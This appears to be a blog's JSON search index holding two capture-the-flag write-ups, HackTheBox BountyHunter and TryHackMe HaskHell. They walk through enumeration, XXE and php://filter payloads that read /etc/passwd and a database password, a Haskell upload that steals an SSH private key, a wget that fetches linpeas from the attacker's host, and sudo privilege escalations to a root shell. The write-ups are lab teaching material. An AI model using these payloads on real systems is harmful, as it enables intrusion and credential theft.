[ { "title": "HackTheBox - BountyHunter | EN", "url": "/posts/HackTheBox-BountyHunter/", "categories": "Writeup, HackTheBox", "tags": "web, xxe, php_filter, hackthebox, writeup", "date": "2022-05-31 09:10:00 +0300", "snippet": "InformationRoom Name: BountyHunter Profile: BountyHunter Difficulty: EasyOverviewIt’s a nice room , you can exploit xxe injection , php wrapper to read data, and get root access with exploiting python code and understand it’s algorithm.Write-upLet’s start enumeration and see what we can gather.Network enumerationPort and service scan with nmap:nmap -sV -T4 -sS -v -Pn -p- 10.129.98.250 -sC -oN htb/BountyHunter/nmapOutput:# Nmap 7.92 scan initiated Tue May 31 08:27:47 2022 as: nmap -sV -T4 -sS -v -Pn -p- -sC -oN htb/BountyHunter/nmap 10.129.98.250Nmap scan report for 10.129.98.250 (10.129.98.250)Host is up (0.086s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Bounty Hunters|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue May 31 08:28:53 2022 -- 1 IP address (1 host up) scanned in 66.19 secondsit’s look we just have ssh and HTTP open with different port , let’s go and enumerate HTTP port.Web enumerationDiscovering directories and files with go buster.gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50Let’s enumerate files and folders then:===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.98.250:80/[+] Method: GET[+] Threads: 50[+] Wordlist: /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/05/31 08:30:34 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/assets (Status: 301) [Size: 315] [--&amp;gt; http://10.129.98.250/assets/]/css (Status: 301) [Size: 312] [--&amp;gt; http://10.129.98.250/css/] /js (Status: 301) [Size: 311] [--&amp;gt; http://10.129.98.250/js/] /resources (Status: 301) [Size: 318] [--&amp;gt; http://10.129.98.250/resources/]after investigation webpage we found web portal , that’s still in the development let’s go to there and look what we can find.# portal http://10.129.98.250/portal.phpwe found there is a log submit system , let’s try to inject some data and see what we will get as a response.we found there is a data in the post request , after look the with decoder it’s look xml to base64 data let’s try to xxe payload if it’s work .&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;asfsdaf&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;sdafdsa&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;222&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;let’s use this xxe payload and send it to server , see the response.after sending xxe payload to server we can read data from server , so let’s move on and read more files.after some try i tried again content discovery with gobuster .gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50 -x phpOutput:===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.98.250:80/[+] Method: GET[+] Threads: 50[+] Wordlist: /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Timeout: 10s===============================================================2022/05/31 08:48:25 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 278]/.htaccess.php (Status: 403) [Size: 278]/.htpasswd.php (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/assets (Status: 301) [Size: 315] [--&amp;gt; http://10.129.98.250/assets/]/css (Status: 301) [Size: 312] [--&amp;gt; http://10.129.98.250/css/] /db.php (Status: 200) [Size: 0] /index.php (Status: 200) [Size: 25169] /js (Status: 301) [Size: 311] [--&amp;gt; http://10.129.98.250/js/] /portal.php (Status: 200) [Size: 125] /resources (Status: 301) [Size: 318] [--&amp;gt; http://10.129.98.250/resources/]/server-status (Status: 403) [Size: 278] let’s read db.php with xxe vulnerability.Web exploitationwe will use this xxe payload to read db.php with PHP filter wrapper. than we will decode it.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=db.php&quot;&amp;gt; ]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;asfsdaf&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;sdafdsa&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;222&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;└─▪echo &#39;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&#39; | base64 -d &amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;now we have credentials let’s try to access server with use we find /etc/passwd file and password we found from db.php file.ssh development@10.129.98.250 pass :m19RoAU0hP41A1sTsq6KPrivilege Escalationlet’s upload linpeas and look if we can get any privilege escalation point to root or other user.# Run Python Serverpython3 -m http.server 80# Get Linpeas wget http://10.8.199.191/linpeas.sh# Run Linpeaschmod +x linpeas.sh./linpeas.shwe found that we can run this file without root password. so let’s go and exploit this vulnerability.after read algorithm of the file i create this payload to get root shell.exploit.md# Skytrain Inc ## Ticket to root __Ticket Code:__ **11+100==111 and exec(&quot;import pty; pty.spawn(\\&quot;/bin/sh\\&quot;)&quot;)let’s run this file and get root shell.development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyPlease enter the path to the ticket file./home/development/exploit.mdDestination: root# iduid=0(root) gid=0(root) groups=0(root)# cat /root/root.txtc4920fb496c6b325d2ff3c5a692f568bYep. Now we Got root.Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me." }, { "title": "Tryhackme - HaskHell | EN", "url": "/posts/Tryhackme-HaskHell/", "categories": "Writeup, TryHackme", "tags": "web, flask, haskell, tryhackme, writeup", "date": "2022-05-30 10:10:00 +0300", "snippet": "InformationRoom Name: HaskHell Profile: HaskHell Difficulty: Medium Description: Show your professor that his PhD isn’t in security.OverviewIt’s a nice room , that you can use haskell and read file inside server . Privilege escalation step was easy actually that you can access root so fast .Write-upLet’s start enumeration and see what we can gather.Network enumerationPort and service scan with nmap:nmap -T4 -sV -sS -v -p- 10.10.238.6 -sC -oN HaskHellOutput:# Nmap 7.92 scan initiated Mon May 30 09:26:16 2022 as: nmap -n -Pn -T4 -sV -sS -v -p- -sC -oN HaskHell 10.10.238.6Nmap scan report for 10.10.238.6Host is up (0.084s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)| 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)|_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)5001/tcp open http Gunicorn 19.7.1|_http-title: Homepage| http-methods:|_ Supported Methods: OPTIONS HEAD GET|_http-server-header: gunicorn/19.7.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelit’s look we just have ssh and http open with different port , let’s go and enumerate http port.Web enumerationDiscovering directories and files with go buster.gobuster dir -u http://10.10.238.6:5001/ -w $BIG -t 50Let’s enumerate files and folders then:Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.238.6:5001/[+] Method: GET[+] Threads: 50[+] Wordlist: /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/05/30 09:31:01 Starting gobuster in directory enumeration mode===============================================================/submit (Status: 200) [Size: 237]===============================================================2022/05/30 09:32:11 Finished===============================================================We found submit directory let’s go and see what’s there. we realized that server is waiting our haskell file for compile and return result.we can try to upload haskhell file and try to read file or get reverse shell , i tried get reverse shell but server givin 500 message , so after time i tried reading files it’s look we have permission to read file, so lets’ get to work and first read /etc/passwd and see what user we can enumerate than we will read this user ssh private key for connect to server with ssh . We can use burpsuite for that we can manipulate easily request and response.http://10.10.238.6:5001/submitupload this file , read_file.hs .import System.Processmain = do let file_to_read = &quot;/etc/passwd&quot; contents &amp;lt;- readFile file_to_read putStrLn contentsafter upload file we can read passwd.let’s go and read user’s id_rsa file. we can enumeate user after start 1000 for this file.i found that we can read prof id_rsa file .change read_file.hs to read ‘/home/prof/.ssh/id_rsa’ and get ssh private key.Web exploitationlet’s use this ssh private key to connect server.chmod 600 haskhellssh prof@10.10.238.6 -i haskhellPrevilege Escalationlet’s upload linpeas and look if we can get any previlege escalation point to root or other user.# Run Python Serverpython3 -m http.server 80# Get Linpeaswget http://10.8.199.191/linpeas.sh# Run Linpeaschmod +x linpeas.sh./linpeas.shwe found that we can run flask with sudo without password , so let’s get root shell from there.echo &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; &amp;gt; shell.pyexport FLASK_APP=shell.pysudo /usr/bin/flask runYep. Now we Got root.Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me." } ]
